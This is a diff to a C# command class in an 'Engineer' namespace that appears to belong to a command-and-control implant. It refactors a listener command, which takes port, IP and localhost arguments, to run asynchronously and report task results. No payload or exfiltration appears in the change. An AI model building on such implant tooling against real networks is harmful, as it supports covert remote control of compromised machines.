@@ -1,4 +1,5 @@
 ﻿using Engineer.Commands;
+using Engineer.Functions;
 using Engineer.Models;
 using System;
 using System.Collections.Generic;
@@ -15,12 +16,12 @@ namespace Engineer.Commands
         public bool ParentIsServer { get; set;}
         public static string Output { get; set;}
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             task.Arguments.TryGetValue("/port", out var serverport);
             task.Arguments.TryGetValue("/ip", out var serverip);
             task.Arguments.TryGetValue("/localhost", out var isLocalHost); //sets if the server should listen on only localhost or on 0.0.0.0
-
+            
             serverport = serverport.TrimStart(' ');
             if (serverip != null)
             {
@@ -57,7 +58,7 @@ namespace Engineer.Commands
             {
                 System.Threading.Thread.Sleep(20);
             }
-            return Output;
+            Tasking.FillTaskResults(Output, task, EngTaskStatus.Complete);
         }
     }
 }
